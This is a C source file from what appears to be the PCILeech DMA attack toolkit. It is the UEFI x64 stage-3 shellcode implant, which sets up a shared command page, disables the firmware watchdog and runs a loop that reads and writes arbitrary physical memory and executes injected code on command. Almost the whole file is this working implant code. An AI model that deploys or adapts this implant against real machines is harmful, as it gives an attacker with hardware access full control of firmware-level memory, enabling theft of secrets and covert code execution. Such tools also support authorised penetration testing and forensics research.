// uefi_kmd_c.c : stage3 main shellcode.
// Compatible with UEFI x64.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0
#define MAX(a, b)				((a > b) ? a : b)

//-------------------------------------------------------------------------------
// EFI related defines below.
//-------------------------------------------------------------------------------

enum {
	EfiReservedMemoryType = 0,
	EfiLoaderCode = 1,
	EfiLoaderData = 2,
	EfiBootServicesCode = 3,
	EfiBootServicesData = 4,
	EfiRuntimeServicesCode = 5,
	EfiRuntimeServicesData = 6,
	EfiConventionalMemory = 7,
	EfiUnusableMemory = 8,
	EfiACPIReclaimMemory = 9,
	EfiACPIMemoryNVS = 10,
	EfiMemoryMappedIO = 11,
	EfiMemoryMappedIOPortSpace = 12,
	EfiPalCode = 13,
	EfiMaxMemoryType = 14
};

typedef struct tdEFI_MEMORY_DESCRIPTOR {
	DWORD Type;
	DWORD Pad;
	QWORD PhysicalStart;
	QWORD VirtualStart;
	QWORD NumberOfPages;
	QWORD Attribute;
} EFI_MEMORY_DESCRIPTOR, *PEFI_MEMORY_DESCRIPTOR;

//-------------------------------------------------------------------------------
// Assembly functions below.
//-------------------------------------------------------------------------------

extern QWORD GetMemoryMap(
	QWORD *MemoryMapSize,
	QWORD *MemoryMap,
	QWORD *MapKey,
	QWORD *DescriptorSize,
	QWORD *DescriptorVersion);

extern QWORD AllocatePages(
	QWORD Type,
	QWORD MemoryType,
	QWORD Pages,
	QWORD *Memory);

extern QWORD FreePages(
	QWORD Memory,
	QWORD Pages);

extern VOID SetMem(
	QWORD *Buffer,
	QWORD Size,
	QWORD Value);

extern VOID CopyMem(
	QWORD *Destination,
	QWORD *Source,
	QWORD Length);

extern QWORD SetWatchdogTimer(
	QWORD Timeout,
	QWORD WatchdogCode,
	QWORD DataSize,
	QWORD *WatchdogData);

//-------------------------------------------------------------------------------
// General defines below.
//-------------------------------------------------------------------------------

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

#define KMDDATA_OPERATING_SYSTEM_UEFI			0x10

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

//-------------------------------------------------------------------------------
// EFI 'kernel' module functionality below
//-------------------------------------------------------------------------------

#define OFFSET_EFI_MEMMAP_DMABUFFER		0x00100000		// 1MB offset

BOOL GetMemoryMapFromEfi(PKMDDATA pk)
{
	QWORD status, cbBuffer, qwMapKey, cbDescriptor, qwDecriptorVersion;
	QWORD o = 0, addr = 0, addrMax = 0;
	PEFI_MEMORY_DESCRIPTOR pmd;
	PPHYSICAL_MEMORY_RANGE pmr;
	// fetch the efi memory map
	cbBuffer = pk->DMASizeBuffer - OFFSET_EFI_MEMMAP_DMABUFFER;
	status = GetMemoryMap(
		&cbBuffer,
		(PQWORD)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER),
		&qwMapKey,
		&cbDescriptor,
		&qwDecriptorVersion);
	if(status) { return FALSE; }
	// fetch maximum physical address
	while(TRUE) {
		if(o >= cbBuffer) { break; }
		pmd = (PEFI_MEMORY_DESCRIPTOR)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER + o);
		addrMax = MAX(addrMax, pmd->PhysicalStart + pmd->NumberOfPages * 0x1000);
		o += cbDescriptor;
	}
	// select readable memory out of the (potentially unordered) memory map
	pk->_size = sizeof(PHYSICAL_MEMORY_RANGE);
	pmr = (PPHYSICAL_MEMORY_RANGE)pk->DMAAddrPhysical;
	pmr->BaseAddress = 0;
	pmr->NumberOfBytes = 0;
	while(addr < addrMax) {
		o = 0;
		while(TRUE) {
			if(o >= cbBuffer) { break; }
			pmd = (PEFI_MEMORY_DESCRIPTOR)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER + o);
			if(addr == pmd->PhysicalStart) {
				if((pmd->Type < EfiMaxMemoryType) && (pmd->Type != EfiReservedMemoryType) && (pmd->Type != EfiUnusableMemory) && (pmd->Type != EfiMemoryMappedIO) && (pmd->Type != EfiMemoryMappedIOPortSpace)) {
					if(pmr->BaseAddress + pmr->NumberOfBytes == pmd->PhysicalStart) {
						pmr->NumberOfBytes += 0x1000 * pmd->NumberOfPages;
					} else {
						if(pmr->BaseAddress + pmr->NumberOfBytes) {
							pk->_size += sizeof(PHYSICAL_MEMORY_RANGE);
							pmr = (PPHYSICAL_MEMORY_RANGE)((QWORD)pmr + sizeof(PHYSICAL_MEMORY_RANGE));
						}
						pmr->BaseAddress = pmd->PhysicalStart;
						pmr->NumberOfBytes = 0x1000 * pmd->NumberOfPages;
					}
				}
				addr += 0x1000 * pmd->NumberOfPages;
				goto next_descriptor;
			}
			o += cbDescriptor;
		}
		// not found
		addr += 0x1000;
		next_descriptor:
		;
	}
	return TRUE;
}

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID c_EntryPoint(PKMDDATA pk, QWORD paUEFI_IBI_SYST)
{
	QWORD status, addr;
	// 1: set up kmd data
	SetMem((PQWORD)pk, 0x1000, 0);
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_UEFI;
	pk->ReservedKMD[0] = paUEFI_IBI_SYST; // Address of UEFI system table
	// 2: allocate memory for buffer
	addr = 0xffffffff;
	pk->DMASizeBuffer = 0x01000000;
	status = AllocatePages(1, EfiBootServicesData, 0x1000, &addr);
	if(status) {
		addr = 0xffffffff;
		pk->DMASizeBuffer = 0x00400000;
		status = AllocatePages(1, EfiBootServicesData, 0x400, &addr);
		if(status) {
			pk->_status = 0xf0000002;
			return;
		}
	}
	pk->DMAAddrPhysical = addr;
	pk->DMAAddrVirtual = addr;
	// 3: disable any watchdog timer (if exists)
	pk->dataOut[2] = SetWatchdogTimer(0, 0, 0, 0);
	// 4: main command loop.
	while(TRUE) {
		pk->_status = 1;
		if (KMD_CMD_COMPLETED == pk->_op) { // NOP
			continue;
		}
		pk->_status = 2;
		if (KMD_CMD_TERMINATE == pk->_op) { // EXIT
			FreePages(pk->DMAAddrPhysical, pk->DMASizeBuffer / 0x1000);
			pk->_status = 0xf0000000;
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = GetMemoryMapFromEfi(pk);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrPhysical)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if((KMD_CMD_READ == pk->_op) || KMD_CMD_READ_VA == pk->_op) { // MEMORY READ (PHYSICAL/VIRTUAL 1:1 MAPPED IN UEFI)
			CopyMem((PQWORD)pk->DMAAddrPhysical, (PQWORD)pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if((KMD_CMD_WRITE == pk->_op) || KMD_CMD_WRITE_VA == pk->_op) { // MEMORY WRITE (PHYSICAL/VIRTUAL 1:1 MAPPED IN UEFI)
			CopyMem((PQWORD)pk->_address, (PQWORD)pk->DMAAddrPhysical, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
	}
}
